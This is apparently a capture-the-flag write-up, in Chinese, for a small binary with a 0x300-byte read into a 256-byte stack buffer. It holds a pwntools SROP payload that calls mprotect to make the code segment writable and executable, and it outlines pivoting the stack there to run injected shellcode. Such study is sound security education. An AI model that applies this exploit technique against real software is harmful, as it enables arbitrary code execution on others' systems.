```c
__int64 start()
{
  signed __int64 v0; // rax

  vuln();
  v0 = sys_exit(0);
  return vuln();
}

signed __int64 vuln()
{
  char buf[256]; // [rsp+0h] [rbp-100h] BYREF

  return sys_write(1u, buf, sys_read(0, buf, 0x300u));
}
```


# 思路

## step1

第一次输入布置栈上入下：
```python
    frame = SigreturnFrame()
    frame.rax = constants.SYS_mprotect
    frame.rdi = 0x400000
    frame.rsi = 0x1000
    frame.rdx = 7
    frame.rsp = stack
    frame.rbp = stack + 0x200
    frame.rip = syscall
    
    payload = b'a'*0x108
    payload += p64(vuln)
    payload += p64(syscall)
    payload += bytes(frame)
```

覆盖第一次的ret，回到 vuln 的入口。

## step2

回到 vuln 入口后，它会构造新的栈帧，执行 vuln 的函数逻辑，这里输入 0xf 字写，用`write()`使 rax 为 0xf ，最后 ret 回`start`的`syscall`:

这里已经通过 srop 将栈劫持到有执行权限的程序段，写入shellcode，并覆盖新栈帧的返回地址到 shellcode 就行。
